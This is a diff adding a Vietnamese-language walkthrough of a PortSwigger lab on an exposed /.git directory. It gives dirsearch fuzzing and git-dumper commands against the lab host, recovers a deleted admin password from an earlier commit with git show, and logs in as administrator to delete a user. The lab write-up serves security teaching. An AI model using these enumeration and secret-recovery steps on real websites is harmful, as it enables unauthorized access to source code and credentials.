@@ -221,10 +221,73 @@ $\implies$ Sửa endpoint thành `/admin/delete?username=carlos` và hoàn thàn
 
 <img width="1072" height="348" alt="image" src="https://github.com/user-attachments/assets/2b161a77-e6e4-43ef-a453-7a8aba7ff119" />
 
-<img width="821" height="690" alt="image" src="https://github.com/user-attachments/assets/6ac95bf0-673c-44a6-acd2-a09aac933e7d" />
+### Enumeration/fuzzing
+
+\- Nhờ việc cài extension [DotGit](https://chromewebstore.google.com/detail/dotgit/pampamgoihgcedonnphgehgondkhikel), sau khi truy cập trang web, nó đã báo với mình việc lộ endpoint /.git trên website:
+
+<img width="713" height="401" alt="image" src="https://github.com/user-attachments/assets/d574e6cb-0630-4e19-ac03-53b5b506b749" />
+
+\- Thêm vào đó, ta có thể fuzzing nhằm đảo bảo không bỏ sót một endpoint/thư mục vào của web:
+
+```
+dirsearch -u https://0ac600e60370b1fa8131b12700ee00d8.web-security-academy.net/ -t 50 -x 503,401,403
+```
+<img width="882" height="813" alt="image" src="https://github.com/user-attachments/assets/8ae5c12e-3916-45d7-9a06-329baa416062" />
 
 
-<img width="1143" height="398" alt="image" src="https://github.com/user-attachments/assets/920fe2aa-653d-4a00-a965-a6469ccd21a1" />
+$\implies$ Khai thác rò rỉ thông tin uqa thư mục kho chứa Git hoặc lịch sử kiểm soát phiên bản
+
+\- **Lý do tại sao có lỗ hổng:** Dev thường dùng lệnh `git clone` hoặc `git pull` trực tiếp trên máy chủ để cập nhật mã nguồn cho nhanh. Khi làm vậy, Git sẽ tự động tạo ra thư mục ẩn .git để quản lý phiên bản
+
+\- Hậu quả:
+- Trace được những gì họ đã thêm, đã sửa, và quan trọng nhất là những gì họ đã cố gắng xóa đi (như mật khẩu, API key, endpoint ẩn)
+- Làm lộ cấu hình nội bộ: Thông tin về server database, các nhánh (branches) đang phát triển dang dở
+
+### Khai thác
+<img width="734" height="670" alt="image" src="https://github.com/user-attachments/assets/4e100f72-af78-49ed-a1c9-006ca118e286" />
+
+\- Truy cập ngay thư mục `/.git/logs/refs/heads` và vào đọc file `master`, ta nhận được:
+```
+0000000000000000000000000000000000000000 1fa8b27a5914d22088834912c6491b62592dd791 Carlos Montoya <carlos@carlos-montoya.net> 1775787050 +0000	commit (initial): Add skeleton admin panel
+1fa8b27a5914d22088834912c6491b62592dd791 61b59646590e3b2650470d3b506c80756e9fcf2d Carlos Montoya <carlos@carlos-montoya.net> 1775787050 +0000	commit: Remove admin password from config
+```
+- Initial commit: Thêm mật khẩu cho admin
+- Một bản cập nhật được đẩy lên nhằm xoá đi mật khẩu
+- **Lý do tại sao có lỗ hổng:**
+  	- Thông thường, khi dev xóa một mật khẩu khỏi mã nguồn và commit, họ nghĩ rằng nó đã biến mất. Nhưng thực tế, Git lưu lại toàn bộ trạng thái của file tại mỗi mốc hash
+
+	- Việc server để lộ thư mục `/.git` cho phép bạn đọc được file log này. Nhìn vào đây, biết chính xác rằng ở phiên bản nào mật khẩu vẫn còn nằm trong file config
+
+ \- Sử dụng `git-dumper` để dump toàn bộ version control history và khôi phục phiên bản trước khi mật khẩu admin bị xoá:
+
+ ```
+git-dumper https://0ac600e60370b1fa8131b12700ee00d8.web-security-academy.net/.git/ portswig
+```
+
+\- Ta đã tải được toàn bộ /.git về và được bonus thêm 2 file nữa liên quan đến admin, với mật khẩu admin được lưu trong `admin.conf`:
+<img width="1096" height="237" alt="image" src="https://github.com/user-attachments/assets/c4969e89-d3ef-4ead-bbb8-d5f3d5451464" />
+
+\- Quay ngược về thời điểm trước khi việc xoá mật khẩu được commit:
+
+```
+cd portswig
+git show 1fa8b27a5914d22088834912c6491b62592dd791:admin.conf
+```
+
+hoặc
+
+```
+cd portswig
+git checkout 1fa8b27a5914d22088834912c6491b62592dd791
+cat admin.conf
+```
+
+<img width="1019" height="145" alt="image" src="https://github.com/user-attachments/assets/f61173b5-b1c5-450c-90d6-b0fa58985bb9" />
+
+\- Thực hiện đăng nhập với `administrator:pnsq53p7z3j4ph5fc1ps` và xoá carlos
+
+<img width="675" height="410" alt="image" src="https://github.com/user-attachments/assets/76e198f9-543d-46fa-8667-2c397b0b46f9" />
+
 
 
 
